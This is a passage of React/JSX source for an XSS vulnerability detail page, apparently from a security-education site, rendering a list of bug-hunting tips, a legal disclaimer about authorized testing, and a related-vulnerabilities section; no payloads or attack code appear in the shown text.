              <h2 className="text-2xl font-bold text-foreground mb-6">
                Pro Bug Hunter Tips
              </h2>
              <div className="space-y-4">
                {proTips?.map((tip, index) => (
                  <div key={index} className="flex gap-4 p-4 bg-background border border-border rounded-lg">
                    <div className="flex-shrink-0">
                      <div className="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center">
                        <svg className="w-5 h-5 text-accent" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                        </svg>
                      </div>
                    </div>
                    <div>
                      <h3 className="font-semibold text-foreground mb-2">{tip?.title}</h3>
                      <p className="text-sm text-muted-foreground">{tip?.tip}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Disclaimer */}
            <div className="mb-8 bg-warning/10 border border-warning/30 rounded-xl p-6">
              <div className="flex items-start gap-4">
                <div className="flex-shrink-0">
                  <svg className="w-6 h-6 text-warning" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-foreground mb-2">⚠️ Legal Disclaimer</h3>
                  <p className="text-sm text-muted-foreground">
                    <strong>Educational and authorized security testing only.</strong> The payloads and techniques described on this page are for ethical hacking, authorized penetration testing, and bug bounty programs where you have explicit permission to test. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any system you do not own.
                  </p>
                </div>
              </div>
            </div>

            <RelatedVulnerabilities vulnerabilities={relatedVulnerabilities} />
          </div>
        </main>
      </div>
    </>
  );
};

export default XSSVulnerabilityDetails;